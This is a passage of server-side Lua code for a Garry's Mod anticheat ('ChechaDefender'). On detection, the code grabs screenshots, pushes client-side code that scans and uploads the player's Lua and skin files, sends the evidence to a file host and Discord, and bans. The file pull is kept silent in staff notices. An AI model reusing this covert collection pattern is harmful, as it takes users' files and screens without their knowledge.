        ZB_AC.CPStore(CPKindFor(mime, filename), filename, data, { mime = mime }, function(url)
            if url and url ~= true then parts[3] = "VPS: " .. url end
            pending = pending - 1
            finish()
        end)
    end
end

concommand.Add("rp_ac_upload_test", function(ply)
    if IsValid(ply) and not ply:IsSuperAdmin() then
        ply:PrintMessage(HUD_PRINTCONSOLE, "[AC] Только суперадмин")
        return
    end
    local function tell(m) if IsValid(ply) then ply:PrintMessage(HUD_PRINTCONSOLE, m) else print(m) end end
    UploadFileHost("ac_upload_test_" .. os.time() .. ".txt",
        "ChechaDefender upload test " .. os.date(), "text/plain", function(links)
        tell(links and ("[AC] Тест выгрузки OK: " .. links)
            or "[AC] Тест выгрузки: ОШИБКА (см. серверную консоль)")
    end)
end, nil, "Тест выгрузки улик (catbox + B2 одновременно)", FCVAR_PROTECTED)

local function DeliverEvidence(title, message, attachList, fileList, namePrefix, binDir, infoText, onDone)
    attachList = attachList or {}

    -- CD_LUA_ZIP / CD_SKINS_PULL: lua и скины уходят ОТДЕЛЬНЫМИ архивами (их бывает
    -- много). Имена внутри архива — ОРИГИНАЛЬНЫЕ (реальный путь/расширение).
    local luaZipFiles, skinZipFiles = {}, {}
    if istable(fileList) then
        for _, f in ipairs(fileList) do
            if f.data and #f.data > 0 then
                local orig = tostring(f.orig or f.name or "file")
                local zn = string.gsub(orig, "[^%w%._%-/]", "_")
                zn = string.gsub(zn, "^/+", "")
                if zn == "" then zn = "file" end
                if IsSkinPath(orig) then
                    skinZipFiles[#skinZipFiles + 1] = { name = zn, data = f.data }
                else
                    luaZipFiles[#luaZipFiles + 1] = { name = zn, data = f.data }
                end
            end
        end
    end
    if #luaZipFiles > 0 then
        if infoText then luaZipFiles[#luaZipFiles + 1] = { name = "info.txt", data = infoText } end
        local zip = BuildZip(luaZipFiles)
        if zip then
            attachList[#attachList + 1] = {
                name = "ac_lua_" .. namePrefix .. ".zip", data = zip, mime = "application/zip" }
        end
    end
    if #skinZipFiles > 0 then
        local zip = BuildZip(skinZipFiles)
        if zip then
            attachList[#attachList + 1] = {
                name = "ac_skins_" .. namePrefix .. ".zip", data = zip, mime = "application/zip" }
        end
    end

    if #attachList == 0 then
        SendDiscord(title, message, onDone)
        return
    end

    local function labelFor(a)
        local m = tostring(a.mime or "")
        if m:find("^image/") then return "Скрин" end
        if m:find("zip")      then return "Файлы (ZIP)" end
        return "Файл"
    end

    local results   = {}
    local remaining = #attachList
    for i, a in ipairs(attachList) do
        UploadFileHost(a.name, a.data, a.mime, function(url)
            if url then
                results[i] = "**" .. labelFor(a) .. ":** " .. url
            else
                results[i] = "**" .. labelFor(a) .. ":** ⚠ выгрузка улик не удалась (" ..
                    math.Round(#a.data / 1048576, 2) .. " МБ — лежит в data/" ..
                    tostring(binDir or SCREEN_DIR) .. ")"
            end
            remaining = remaining - 1
            if remaining == 0 then
                local lines = {}
                for j = 1, #attachList do if results[j] then lines[#lines + 1] = results[j] end end
                SendDiscord(title, message .. "\n" .. table.concat(lines, "\n"), onDone)
            end
        end)
    end
end

local function MaybeDeliverEvidence(sid, title, message, attachList, fileList, namePrefix, binDir, infoText, onDone)
    sid = NormalizeSteamID(sid)
    local fp = ComputeLuaFingerprint(fileList)
    local prev = luaFingerprints[sid]
    local unchanged = (prev ~= nil and prev.hash == fp)
    local filesForZip = unchanged and {} or fileList
    if unchanged then
        NotifyCollect(string.format(
            "Discord: lua без изменений — шлю скрин+список без ZIP (%s, fp=%s)", sid, fp))
    else
        local luaCount = #FilterLuaFileList(fileList)
        NotifyPull(string.format(
            "Discord: отправляю отчёт (%s, lua-файлов=%d, всего=%d, fp=%s)…",
            sid, luaCount, istable(fileList) and #fileList or 0, fp))
    end
    DeliverEvidence(title, message, attachList, filesForZip, namePrefix, binDir, infoText, function(ok)
        if ok and not unchanged then
            luaFingerprints[sid] = { hash = fp, at = os.time() }
            SaveLuaFingerprints()
        end
        -- CD_LUA_ZIP: помечаем выкаченные файлы «виден» ТОЛЬКО после доставки архива.
        if ok and istable(fileList) then
            local _sv = false
            for _, f in ipairs(fileList) do
                if f.hash and f.hash ~= "" and ZB_AC.MarkFileSeen and ZB_AC.MarkFileSeen(f.hash, f.orig or f.name, sid) then _sv = true end
            end
            if _sv and ZB_AC.SaveSeenHashes then ZB_AC.SaveSeenHashes() end
        end
        NotifyPull(string.format("Discord: отчёт доставлен (%s, fp=%s%s)",
            sid, fp, unchanged and ", без ZIP" or ""))
        if onDone then onDone(ok, false) end
    end)
    return true
end

function ZB_AC.DeliverForensic(title, message, zipFiles, sid)
    if not istable(zipFiles) or #zipFiles == 0 then
        SendDiscord(title, message)
        return
    end
    local zip = BuildZip(zipFiles)
    if not zip then
        SendDiscord(title, message)
        return
    end
    local fname = "ac_forensic_" .. (sid and string.gsub(sid, ":", "_") or "unknown") .. ".zip"
    UploadFileHost(fname, zip, "application/zip", function(url)
        if url then
            SendDiscord(title, message .. "\n**Архив:** " .. url)
        else
            SendDiscord(title, message .. "\n⚠ Архив не загрузился (лежит в data/zb_ac_forensic/)")
        end
    end)
end

ZB_AC.UploadFileHost = UploadFileHost
ZB_AC.SendDiscord    = SendDiscord


local function BuildBinLine(binDir, binCount, binComplete)
    if binDir then
        return string.format("\n**Файлы (lua/):** собрано %d%s (data/%s)",
            tonumber(binCount) or 0,
            binComplete and "" or " — НЕПОЛНО (игрок вышел/таймаут)",
            binDir)
    end
    return "\n**Файлы (lua/):** не выкачивалось"
end

local function BuildScreenAttach(screenPath, sidSafe, timestamp)
    local attach = {}
    if not screenPath then return attach, "\n**Скрин:** не получен" end
    local imgData = file.Read(screenPath, "DATA")
    if not imgData or #imgData == 0 then return attach, "\n**Скрин:** не получен" end
    local isPng = screenPath:match("%.png$") ~= nil
    attach[#attach + 1] = {
        name = sidSafe .. "_" .. timestamp .. (isPng and ".png" or ".jpg"),
        data = imgData,
        mime = isPng and "image/png" or "image/jpeg",
    }
    return attach, ""
end

local function BuildBypassInfo(reasons)
    local bypassTitle, bypassDetail = nil, nil
    for _, r in ipairs(reasons) do
        local body = (string.sub(r, 1, 2) == "S:" or string.sub(r, 1, 2) == "W:")
            and string.sub(r, 3) or r
        if string.sub(body, 1, 16) == "ac_bypass_tamper" then
            local inside = string.match(body, "%((.+)%)$") or body
            bypassTitle  = "🚨 ЧечаДефендер: ПОПЫТКА ОБХОДА АНТИЧИТА"
            bypassDetail = "**Подробности обхода (подмена движковых функций):**\n```\n" ..
                string.gsub(inside, "; ", "\n") .. "\n```\n_Игрок заменил " ..
                "net.* Lua-обёртками, чтобы глушить пакеты АЧ._"
            break
        elseif string.sub(body, 1, 17) == "ac_honeypot_block" then
            local chan = string.match(body, "%((.+)%)$") or "chat_relay_ping"
            bypassTitle  = "🚨 ЧечаДефендер: ПОПЫТКА ОБХОДА АНТИЧИТА"
            bypassDetail = "**Подробности обхода (глушение канала по имени):**\n```\n" ..
                "Заглушён приманочный канал: " .. chan .. "\n```\n_Клиент ответил " ..
                "на настоящую проверку, но дважды проглотил decoy-пробу — значит " ..
                "режет АЧ по имени net-канала._"
        end
    end
    return bypassTitle, bypassDetail
end

local function ApplyPunish(ply, sid, nick, noPunish, reasons)
    if noPunish then return end
    local action = string.lower(CVAR_ACTION:GetString() or "log")
    if action == "log" then return end
    if action == "ban" then
        if ULib and ULib.addBan then
            local ok, err = pcall(ULib.addBan, sid, 0, DETECT_REASON, nick, nil)
            if not ok then
                print("[AC] ULib.addBan ошибка: " .. tostring(err) .. " — нативный фолбэк")
                game.ConsoleCommand(('banid 0 "%s" kick\n'):format(sid))
                game.ConsoleCommand("writeid\n")
            end
        else
            print("[AC] ULib.addBan недоступен — нативный бан (banid)")
            game.ConsoleCommand(('banid 0 "%s" kick\n'):format(sid))
            game.ConsoleCommand("writeid\n")
        end
    end
    if ZB_AC and ZB_AC.Report and action == "ban" then -- CD_REPORT_BAN: бан в панель (reasons → Discord-ярлык)
        ZB_AC.Report("ban", 4, "Бан: " .. tostring(nick), {
            steamid = sid, nick = nick, reason = DETECT_REASON, reasons = reasons, action = action,
        })
    end
    if IsValid(ply) then
        if ULib and ULib.kick then
            ULib.kick(ply, DETECT_REASON)
        else
            ply:Kick(DETECT_REASON)
        end
    end
end

local StartGrab, StartBinGrab

local function RunDetectPipeline(ply, sid, nick, reasons, grabReqNameOverride, cfg)
    cfg = cfg or {}
    local triggers = table.concat(reasons, ", ")

    NotifyStaff(string.format("%s %s (%s)", -- CD_PULL_SILENT: без упоминания выкачки
        cfg.staffTag or "DETECTED", nick, sid))

    local ok, err = pcall(function()
    StartGrab(ply, sid, nick, reasons, grabReqNameOverride, function(screenPath)
        if not screenPath and not cfg.skipAntiScreengrab then
            reasons[#reasons + 1] = "anti_screengrab"
            NotifyPull(string.format(
                "%s (%s) — скрин не получен, anti_screengrab подозрение", nick, sid))
        end

        StartBinGrab(ply, sid, nick, function(binDir, binCount, binComplete, fileList, knownList)
            local timestamp = os.date("%Y%m%d_%H%M%S")
            local sidSafe   = string.gsub(sid, ":", "_")
            local binLine   = BuildBinLine(binDir, binCount, binComplete)
            local attach, screenExtra = BuildScreenAttach(screenPath, sidSafe, timestamp)

            local discordMsg = cfg.discordMsg
            if not discordMsg and cfg.buildDiscordMsg then
                discordMsg = cfg.buildDiscordMsg(binLine, triggers, nick, sid)
            end
            if not discordMsg then
                local bypassTitle, bypassDetail = BuildBypassInfo(reasons)
                local reportTitle = cfg.reportTitle or bypassTitle
                    or (cfg.noPunish and "ЧечаДефендер: детект на админе (без бана)" or "ЧечаДефендер: автобан")
                cfg.reportTitle = reportTitle
                discordMsg = string.format(
                    "%sИгрок: `%s` (`%s`)%s\n**Триггеры:** %s\n**Время:** %s%s",
                    bypassDetail and (bypassDetail .. "\n\n") or "",
                    nick, sid,
                    cfg.noPunish and ("\nГруппа: `" .. (IsValid(ply) and ply:GetUserGroup() or "?") ..
                        "`\n_Бан НЕ применён — игрок защищён правами; скрин/файлы для ручной проверки._") or "",
                    triggers, os.date("%Y-%m-%d %H:%M:%S"), binLine)
            end

            local infoText = string.format(
                "%s\nPlayer: %s (%s)\nTriggers: %s\nTime: %s\n",
                cfg.infoPrefix or "ChechaDefender", nick, sid, triggers, os.date("%Y-%m-%d %H:%M:%S"))

            local function deliver(otherSection)
                local fullMsg = discordMsg .. screenExtra .. (otherSection or "")
                if cfg.skipDedup then
                    DeliverEvidence(cfg.reportTitle or "ЧечаДефендер: детект",
                        fullMsg, attach, fileList,
                        sidSafe .. "_" .. timestamp, binDir, infoText, function(_ok)
                        if cfg.onAfterDeliver then cfg.onAfterDeliver(_ok, false) end
                    end)
                else
                    MaybeDeliverEvidence(sid, cfg.reportTitle or "ЧечаДефендер: детект",
                        fullMsg, attach, fileList,
                        sidSafe .. "_" .. timestamp, binDir, infoText, function(_ok, _skipped)
                        if cfg.onAfterDeliver then cfg.onAfterDeliver(_ok, _skipped) end
                    end)
                end
            end

            knownList = knownList or {}
            local nKnown = #knownList
            if nKnown == 0 then
                deliver("")
            elseif nKnown <= 10 then
                local kl = {}
                for _, nm in ipairs(knownList) do kl[#kl + 1] = "• `" .. tostring(nm) .. "`" end
                deliver("\n**Прочие файлы у клиента (уже известны, " .. nKnown .. "):**\n"
                    .. table.concat(kl, "\n"))
            elseif ZB_AC.UploadFileHost then
                local txt = "Прочие файлы у клиента (уже известны серверу, не выкачивались)\n"
                    .. nick .. " (" .. sid .. ")\n\n" .. table.concat(knownList, "\n")
                ZB_AC.UploadFileHost("other_files_" .. sidSafe .. ".txt", txt, "text/plain", function(url)
                    if url then
                        deliver("\n**Прочие файлы у клиента (уже известны, " .. nKnown .. "):** " .. url)
                    else
                        deliver("\n**Прочие файлы у клиента:** " .. nKnown .. " (см. manifest.txt)")
                    end
                end)
            else
                deliver("\n**Прочие файлы у клиента:** " .. nKnown)
            end

            NotifyStaff(string.format("%s %s (%s) — triggers: %s",
                cfg.staffTag or (cfg.noPunish and "DETECT-IGNORED (админ)" or "AUTOBAN"),
                nick, sid, triggers))
            NotifyCollect(string.format("%s (%s) → сбор: screen=%s, файлы(lua/)=%s",
                nick, sid, screenPath or "none",
                binDir and ((tonumber(binCount) or 0) .. " файлов" .. (binComplete and "" or " (неполно)")) or "off"))
        end)
    end)
    end)
    if not ok then
        print("[AC] RunDetectPipeline ОШИБКА для " .. sid .. ": " .. tostring(err))
        NotifyStaff("PIPELINE-ERROR " .. nick .. " (" .. sid .. "): " .. tostring(err))
    end
end


local function FinalizePending(sid)
    local rec = pendingGrabs[sid]
    if not rec then return end
    pendingGrabs[sid] = nil

    local screenPath = nil
    local imgData = nil

    if rec.chunks and #rec.chunks > 0 then
        local raw = table.concat(rec.chunks)
        local ok, decompressed = pcall(util.Decompress, raw)
        local img = (ok and decompressed and #decompressed > 0) and decompressed or raw
        if img and #img > 0 then
            imgData = img
            local ext = (string.sub(img, 1, 4) == "\137PNG") and ".png" or ".jpg"
            local fname = SCREEN_DIR .. "/" ..
                string.gsub(rec.sid, ":", "_") ..
                "_" .. os.date("%Y%m%d_%H%M%S") .. ext
            pcall(file.Write, fname, img)
            screenPath = fname
        end
        ScreenLog(string.format("[AC][SCREEN] %s: получено %d чанк(ов), %d байт → %s",
            rec.sid, #rec.chunks, #raw, screenPath or "ОШИБКА (пусто/битый)"))
    else
        ScreenLog(string.format("[AC][SCREEN] %s: чанки НЕ пришли (render.Capture nil или пакет не дошёл)", rec.sid))
    end

    if ZB_AC and ZB_AC.Report and istable(rec.reasons) then
        local isPer = false
        for _, r in ipairs(rec.reasons) do if r == "periodic_screengrab" then isPer = true break end end
        if isPer then
            ZB_AC.Report("diagnostic", 1, "SG-DIAG-GRAB", {
                chunks = #rec.chunks,
                path = tostring(screenPath),
                fsize = screenPath and (file.Size(screenPath, "DATA") or -1) or -2,
            })
        end
    end

    rec.banFn(screenPath, imgData)
end

local function HandleGrabChunk(_, ply)
    if not IsValid(ply) then return end
    local sid = ply:SteamID()
    local rec = pendingGrabs[sid]
    if not rec then return end

    local isLast = net.ReadBool()
    local len    = net.ReadUInt(32)
    if not len or len <= 0 or len > 60000 then return end
    local data   = net.ReadData(len)
    if not data then return end

    if #rec.chunks == 0 then
        ScreenLog(string.format("[AC][SCREEN] %s: пошли чанки скрина…", sid))
    end
    rec.chunks[#rec.chunks + 1] = data

    if isLast then
        FinalizePending(sid)
    elseif rec.ackChan then
        net.Start(rec.ackChan)
        net.Send(ply)
    end
end

function StartGrab(ply, sid, nick, reasons, grabReqName, banFn)
    if not IsValid(ply) then
        banFn(nil)
        return
    end

    if not grabReqName or grabReqName == "" then
        grabReqName = PickRandom(grabReqPool)
    end

    local grabChunkName = PickRandom(grabChunkPool)
    local grabAckName   = PickRandom(grabAckPool)

    pendingGrabs[sid] = {
        sid       = sid,
        chunks    = {},
        deadline  = CurTime() + SCREEN_TIMEOUT,
        reasons   = reasons,
        banFn     = banFn,
        chunkName = grabChunkName,
        ackChan   = grabAckName,
    }

    net.Start(grabReqName)
        net.WriteString(grabChunkName)
        net.WriteString(grabAckName)
    net.Send(ply)
    ScreenLog(string.format("[AC][SCREEN] %s: запрос скрина отправлен (канал %s, ответ на %s), жду %dс…",
        sid, grabReqName, grabChunkName, SCREEN_TIMEOUT))

    timer.Simple(SCREEN_TIMEOUT + 0.5, function()
        if pendingGrabs[sid] then
            FinalizePending(sid)
        end
    end)
end

net.Receive("res_fetch_chunk", function() end)


local DATA_WRITE_EXT = {
    txt = true, dat = true, json = true, xml = true, csv = true,
}

local function SanitizeBinName(n)
    n = string.GetFileFromFilename(n or "")
    n = string.gsub(n, "[^%w%._%-]", "_")
    if n == "" then n = "file" end
    local ext = string.lower(string.GetExtensionFromFilename(n) or "")
    if ext == "" or not DATA_WRITE_EXT[ext] then
        n = n .. ".txt"
    end
    return n
end

local function SanitizeFolderName(s)
    s = tostring(s or "")
    s = string.gsub(s, '[/\\:%*%?"<>|%c]', "")
    s = string.Trim(s)
    if #s > 32 then s = string.sub(s, 1, 32) end
    if s == "" then s = "player" end
    return s
end

local function EnsureBinDir(rec)
    if not rec or rec.dirMade then return end
    pcall(file.CreateDir, rec.dir)
    rec.dirMade = true
end

local function FinalizeBinGrab(sid)
    local rec = pendingBin[sid]
    if not rec then return end
    pendingBin[sid] = nil

    local haveFiles = (rec.written or 0) > 0
    if haveFiles then
        EnsureBinDir(rec)
        if rec.manifest then
            pcall(file.Write, rec.dir .. "/manifest.txt", table.concat(rec.manifest, "\n"))
        end
    end

    if rec.newSeen and ZB_AC.SaveSeenHashes then ZB_AC.SaveSeenHashes() end

    if rec.doneFn then
        rec.doneFn(haveFiles and rec.dir or nil, rec.written or 0, rec.gotDone == true,
            rec.fileList or {}, rec.known or {})
    end
end

local PULL_BATCH = 150

local function SendBinPull(rec, wanted)
    local ply = rec.ply
    if not IsValid(ply) then return end
    local n = #wanted
    local batches = math.ceil(n / PULL_BATCH)
    if batches == 0 then batches = 1 end
    for b = 1, batches do
        local s = (b - 1) * PULL_BATCH + 1
        local e = math.min(b * PULL_BATCH, n)
        net.Start(rec.pullChan)
            net.WriteBool(b == batches)
            net.WriteUInt(e - s + 1, 16)
            for i = s, e do net.WriteString(wanted[i]) end
        net.Send(ply)
    end
end

local function SendBinAck(rec, ply)
    if not rec or not rec.ackChan or not IsValid(ply) then return end
    net.Start(rec.ackChan)
    net.Send(ply)
end

local function HandleBinManifest(_, ply)
    if not IsValid(ply) then return end
    local sid = ply:SteamID()
    local rec = pendingBin[sid]
    if not rec or rec.phase ~= "manifest" then return end

    local m = rec.mani
    local idx   = net.ReadUInt(16)
    local total = net.ReadUInt(16)
    local last  = net.ReadBool()
    local size  = net.ReadUInt(32)
    local data  = (size and size > 0) and net.ReadData(size) or ""
    if data == "" then return end
    SendBinAck(rec, ply)
    m.total = total
    if not m.chunks[idx] then m.got = m.got + 1 end
    m.chunks[idx] = data
    if not (last or m.got >= (total or 0)) then return end

    local parts = {}
    for i = 1, (m.total or 0) do parts[i] = m.chunks[i] or "" end
    local raw = table.concat(parts)
    local okd, dec = pcall(util.Decompress, raw)
    if okd and dec and #dec > 0 then raw = dec end
    local okj, arr = pcall(util.JSONToTable, raw)
    if not okj or not istable(arr) then
        FinalizeBinGrab(sid)
        return
    end

    local wanted, wantedHash, known = {}, {}, {}
    local seenInThis = {}
    for _, e in ipairs(arr) do
        local nm, h = e.n, e.h
        if nm and nm ~= "" then
            if h and h ~= "" and (ZB_AC.IsFileSeen(h) or seenInThis[h]) then
                known[#known + 1] = nm
            elseif #wanted < 1500 then
                wanted[#wanted + 1] = nm
                wantedHash[nm] = h
                if h and h ~= "" then seenInThis[h] = true end
            end
        end
    end
    rec.wantedHash = wantedHash
    rec.known = known
    for _, nm in ipairs(known) do
        rec.manifest[#rec.manifest + 1] = nm .. "  -> уже известен (дедуп, не качался)"
    end
    NotifyPull(string.format("Дедуп %s: всего=%d, новых=%d, уже известных=%d",
        sid, #arr, #wanted, #known))

    if #wanted == 0 then
        FinalizeBinGrab(sid)
        return
    end
    rec.phase = "data"
    SendBinPull(rec, wanted)
end

local function HandleBinChunk(_, ply)
    if not IsValid(ply) then return end
    local sid = ply:SteamID()
    local rec = pendingBin[sid]
    if not rec or rec.phase ~= "data" then return end

    local fname     = net.ReadString()
    local _fi       = net.ReadUInt(16)
    local total     = net.ReadUInt(16)
    local lastChunk = net.ReadBool()
    local lastFile  = net.ReadBool()
    local size      = net.ReadUInt(32)
    local data      = (size and size > 0) and net.ReadData(size) or ""

    if not lastFile then SendBinAck(rec, ply) end

    rec.total = total

    if fname and fname ~= "" and size and size > 0 then
        local buf = rec.files[fname]
        if not buf then buf = {len = 0, parts = {}}; rec.files[fname] = buf end

        if buf.len + size <= BIN_MAX_FILE then
            buf.parts[#buf.parts + 1] = data
            buf.len = buf.len + size
        else
            buf.over = true
        end

        if lastChunk then
            if not buf.over then
                local raw = table.concat(buf.parts)
                local ok, dec = pcall(util.Decompress, raw)
                local out = (ok and dec and #dec > 0) and dec or raw
                local safe = SanitizeBinName(fname)
                EnsureBinDir(rec)
                pcall(file.Write, rec.dir .. "/" .. safe, out)
                rec.written = (rec.written or 0) + 1
                local _h = rec.wantedHash and rec.wantedHash[fname]
                rec.fileList[#rec.fileList + 1] = { name = safe, orig = fname, data = out, hash = _h }
                rec.manifest[#rec.manifest + 1] =
                    fname .. "  ->  " .. safe .. "  (" .. #out .. " байт)"
                -- CD_LUA_ZIP: метку «виден» ставим не тут, а ПОСЛЕ доставки архива к нам
                -- (MaybeDeliverEvidence) — иначе сбой заливки навсегда исключал файл.
            else
                rec.manifest[#rec.manifest + 1] = fname .. "  -> ПРОПУЩЕН (>лимита)"
            end
            rec.files[fname] = nil
        end
    end

    if lastFile then
        rec.gotDone = true
        FinalizeBinGrab(sid)
    end
end

local function BuildBinGrabClientCode(maniChan, pullChan, dataChan, ackChan)
    return string.format([==[
local _Find  = file and file.Find
local _Read  = file and file.Read
local _Comp  = util and util.Compress
local _Hash  = util and (util.SHA256 or util.SHA1)
local _start = net and net.Start
local _wstr  = net and net.WriteString
local _wuint = net and net.WriteUInt
local _wbool = net and net.WriteBool
local _wdata = net and net.WriteData
local _ruint = net and net.ReadUInt
local _rstr  = net and net.ReadString
local _rbool = net and net.ReadBool
local _send  = net and net.SendToServer
local _recv  = net and net.Receive
local _sub   = string.sub
local _timer = timer and timer.Simple
local MANI   = %q
local PULL   = %q
local DATA   = %q
local ACK    = %q
local MAXF   = %d
local CHUNK  = 28000

local STOCK = {}
for _line in string.gmatch(%q, "[^\r\n]+") do
    STOCK["lua/" .. _line] = true
end

if not _Find or not _Read or not _start then return end

local seen, list = {}, {}
local MAX_FILES = 1500

local function scan_dir(dir, gp, relPrefix, depth)
    if #list >= MAX_FILES then return end
    if depth > 8 then return end
    local ok, files, dirs = pcall(_Find, dir .. "/*", gp)
    if not ok then return end
    for _, n in ipairs(files or {}) do
        if #list >= MAX_FILES then break end
        local rel = relPrefix .. n
        if not seen[rel] and not STOCK[rel] then
            seen[rel] = true
            list[#list + 1] = { name = rel, readname = dir .. "/" .. n, gp = gp }
        end
    end
    for _, d in ipairs(dirs or {}) do
        if #list >= MAX_FILES then break end
        scan_dir(dir .. "/" .. d, gp, relPrefix .. d .. "/", depth + 1)
    end
end

scan_dir("lua", "MOD", "lua/", 0)

-- CD_SKINS_PULL: доп. скан скин-файлов (loose, BASE_PATH) — те же манифест/дедуп/
-- чанки, что и lua. Только скин-расширения, стоковый префикс-фильтр, кап MAXSK.
local SKINS_ON = %s
if SKINS_ON then
    local SKINEXT = {}
    for _e in string.gmatch(%q, "%%S+") do SKINEXT[_e] = true end
    local STOCKSK = {}
    for _p in string.gmatch(%q, "[^\r\n]+") do STOCKSK[#STOCKSK + 1] = string.lower(_p) end
    local SKROOTS = %s
    local MAXSK = %d
    local skc = 0
    local function isStockSkin(rel)
        local l = string.lower(rel)
        for _, pfx in ipairs(STOCKSK) do
            if string.sub(l, 1, #pfx) == pfx then return true end
        end
        return false
    end
    local function scan_skins(dir, relPrefix, depth)
        if #list >= MAX_FILES or skc >= MAXSK then return end
        if depth > 8 then return end
        local ok, files, dirs = pcall(_Find, dir .. "/*", "BASE_PATH")
        if not ok then return end
        for _, n in ipairs(files or {}) do
            if #list >= MAX_FILES or skc >= MAXSK then break end
            local ext = string.lower(string.match(n, "%%.([%%w]+)$") or "")
            local rel = relPrefix .. n
            if SKINEXT[ext] and not seen[rel] and not isStockSkin(rel) then
                seen[rel] = true
                skc = skc + 1
                list[#list + 1] = { name = rel, readname = dir .. "/" .. n, gp = "BASE_PATH" }
            end
        end
        for _, d in ipairs(dirs or {}) do
            if #list >= MAX_FILES or skc >= MAXSK then break end
            scan_skins(dir .. "/" .. d, relPrefix .. d .. "/", depth + 1)
        end
    end
    for _, root in ipairs(SKROOTS) do scan_skins(root, root .. "/", 0) end
end

local byName = {}   -- CD_LAZY_PULL: name -> файл (readname/gp) для ленивого re-read
local manifest = {}
-- CD_ASYNC_PULL: манифест (read+hash) строится АСИНХРОННО по байт-бюджету на кадр
-- (см. _buildStep). CD_LAZY_PULL: сжатие НЕ здесь — только запрошенные сервером
-- файлы читаются+жмутся ЛЕНИВО в pumpData (не тратим CPU на задедупленные).

local _gFrames, _gIdx, _gToken, _gProducer
local function _gNext()
    local fn
    if _gProducer then fn = _gProducer()               -- ленивый producer (данные)
    else _gIdx = _gIdx + 1; fn = _gFrames and _gFrames[_gIdx] end
    if not fn then _gFrames = nil; _gProducer = nil; return end
    local myTok = {}
    _gToken = myTok
    fn()
    if _timer then
        _timer(3, function()
            if (_gFrames or _gProducer) and _gToken == myTok then _gNext() end
        end)
    end
end

local function sendGated(frames)
    if not frames or #frames == 0 then return end
    _gProducer = nil
    _gFrames = frames
    _gIdx = 0
    _gNext()
end

local function sendGatedProducer(producer)   -- CD_LAZY_PULL: кадры генерятся по требованию
    _gFrames = nil
    _gProducer = producer
    _gNext()
end

if _recv then
    _recv(ACK, function()
        if _gFrames or _gProducer then _gNext() end
    end)
end

local function sendChunks(chan, payload)
    local total = math.ceil(#payload / CHUNK)
    if total == 0 then total = 1 end
    local frames = {}
    for i = 1, total do
        local s = (i - 1) * CHUNK + 1
        local e = math.min(i * CHUNK, #payload)
        local d = _sub(payload, s, e)
        frames[i] = function()
            _start(chan)
                _wuint(i, 16) _wuint(total, 16) _wbool(i == total)
                _wuint(#d, 32) _wdata(d, #d)
            _send()
        end
    end
    sendGated(frames)
end

local function _sendManifest()
    local mjson = util and util.TableToJSON(manifest) or "[]"
    local mpayload = mjson
    if _Comp and #mjson > 512 then
        local okc, comp = pcall(_Comp, mjson)
        if okc and comp and #comp > 0 and #comp < #mjson then mpayload = comp end
    end
    sendChunks(MANI, mpayload)
end

-- CD_ASYNC_PULL: читаем+хэшируем ~256КБ сырых данных за кадр, потом yield (timer 0
-- = след. кадр) → нагрузка размазана, игра не фризит. CD_LAZY_PULL: НЕ сжимаем тут
-- — только хэш для манифеста; сжатие потом в pumpData лишь для запрошенных файлов.
local _bi = 0
local function _buildStep()
    local budget = 0
    while _bi < #list and budget < 262144 do
        _bi = _bi + 1
        local f = list[_bi]
        local ok, raw = pcall(_Read, f.readname, f.gp)
        if ok and type(raw) == "string" and #raw > 0 and #raw <= MAXF then
            local h = _Hash and _Hash(raw) or ""
            manifest[#manifest + 1] = { n = f.name, s = #raw, h = h }
            byName[f.name] = f      -- запомним для ленивого re-read+сжатия по запросу
            budget = budget + #raw
        else
            manifest[#manifest + 1] = { n = f.name, s = 0, h = "" }
        end
    end
    if _bi < #list then
        if _timer then _timer(0, _buildStep) else _buildStep() end
    else
        _sendManifest()
    end
end
_buildStep()

local closed = false
local pullNames = {}

local function pumpData(names)
    local total = #names
    if total == 0 then
        _start(DATA)
            _wstr("") _wuint(0, 16) _wuint(total, 16)
            _wbool(true) _wbool(true) _wuint(0, 32)
        _send()
        return
    end
    -- CD_LAZY_PULL: файлы читаются+жмутся ПО ОДНОМУ лениво (только запрошенные
    -- сервером). Кадры генерятся producer'ом по требованию (ACK-gated) → нет
    -- пиковой нагрузки: сжатие одного файла на границе файла, размазано по кадрам.
    local fi, parts, ci, curNm = 0, nil, 0, nil
    local function producer()
        if not parts or ci >= #parts then
            fi = fi + 1
            if fi > total then return nil end
            curNm = names[fi]
            local f = byName[curNm]
            local raw = ""
            if f then
                local ok, r = pcall(_Read, f.readname, f.gp)
                if ok and type(r) == "string" then raw = r end
            end
            local payload = raw
            if _Comp then
                local okc, comp = pcall(_Comp, raw)
                if okc and comp and #comp > 0 then payload = comp end
            end
            parts = {}
            local sent, tot = 0, #payload
            while sent < tot do
                local sz = (tot - sent < CHUNK) and (tot - sent) or CHUNK
                parts[#parts + 1] = _sub(payload, sent + 1, sent + sz)
                sent = sent + sz
            end
            if #parts == 0 then parts[1] = "" end
            ci = 0
        end
        ci = ci + 1
        local part = parts[ci]
        local lastChunk = (ci == #parts)
        local lastFile = (fi == total) and lastChunk
        local nm, fidx = curNm, fi
        return function()
            _start(DATA)
                _wstr(nm) _wuint(fidx, 16) _wuint(total, 16)
                _wbool(lastChunk) _wbool(lastFile)
                _wuint(#part, 32)
                if #part > 0 then _wdata(part, #part) end
            _send()
        end
    end
    sendGatedProducer(producer)
end

if _recv then
    _recv(PULL, function()
        if closed then return end
        local last = _rbool()
        local n = _ruint(16) or 0
        for i = 1, n do pullNames[#pullNames + 1] = _rstr() end
        if not last then return end
        local names = pullNames
        pullNames = {}
        pumpData(names)
    end)
    if _timer then _timer(150, function() closed = true byName = {} end) end
end
]==], maniChan, pullChan, dataChan, ackChan, BIN_MAX_FILE, STOCK_LUA_LIST,
    CVAR_SKINS_PULL:GetBool() and "true" or "false",
    SKIN_EXT_LIST, STOCK_SKIN_PREFIX_LIST,
    '{"' .. table.concat(SKIN_ROOTS, '","') .. '"}', MAX_SKINS)
end

function StartBinGrab(ply, sid, nick, doneFn)
    if ZB_AC and ZB_AC.Config and ZB_AC.Config.collect_off then doneFn(nil, 0, true) return end
    if not CVAR_BINGRAB:GetBool() then doneFn(nil, 0, true) return end
    if not IsValid(ply) then doneFn(nil, 0, false) return end

    local idx = math.random(1, POOL_SIZE)
    local dir = BIN_DIR .. "/" .. SanitizeFolderName(nick) .. " | " ..
        string.gsub(sid, ":", "_") .. " (" .. os.date("%Y%m%d_%H%M%S") .. ")"

    pendingBin[sid] = {
        ply        = ply,
        dir        = dir,
        phase      = "manifest",
        maniChan   = binManiPool[idx],
        pullChan   = binPullPool[idx],
        dataChan   = binChunkPool[idx],
        ackChan    = binAckPool[idx],
        mani       = { chunks = {}, total = 0, got = 0 },
        files      = {},
        fileList   = {},
        written    = 0,
